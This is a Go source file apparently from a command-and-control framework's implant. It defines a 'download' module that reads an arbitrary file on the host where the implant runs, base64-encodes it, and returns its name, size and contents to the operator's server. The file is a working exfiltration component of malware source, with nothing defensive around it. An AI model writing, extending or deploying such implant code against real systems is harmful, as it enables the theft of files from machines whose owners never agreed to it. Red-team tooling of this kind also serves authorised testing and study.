package download

import (
	"encoding/base64"
	"fmt"
	"os"

	"github.com/r74tech/virga/internal/implant/logger"
)

// DownloadModule handles file download from implant to server
type DownloadModule struct{}

// Name returns the module name
func (m *DownloadModule) Name() string {
	return "download"
}

// Execute handles file download
// args[0] should be the remote path to download
func (m *DownloadModule) Execute(args []string) (string, int, error) {
	if len(args) == 0 {
		return "", 1, fmt.Errorf("download requires remote_path argument")
	}

	remotePath := args[0]

	log := logger.Get()
	log.Debug("Download module executing", map[string]interface{}{
		"remote_path": remotePath,
	})

	// Read file
	content, err := os.ReadFile(remotePath)
	if err != nil {
		log.LogCommand(fmt.Sprintf("download %s", remotePath), "", 1, err)
		return fmt.Sprintf("Failed to read file: %s", err), 1, err
	}

	// Get file info
	info, err := os.Stat(remotePath)
	if err != nil {
		log.LogCommand(fmt.Sprintf("download %s", remotePath), "", 1, err)
		return fmt.Sprintf("Failed to stat file: %s", err), 1, err
	}

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(content)

	// Return base64 encoded content
	result := fmt.Sprintf("size:%d\nname:%s\ncontent:%s", info.Size(), info.Name(), encoded)
	log.LogCommand(fmt.Sprintf("download %s", remotePath), fmt.Sprintf("Downloaded %d bytes", info.Size()), 0, nil)
	return result, 0, nil
}
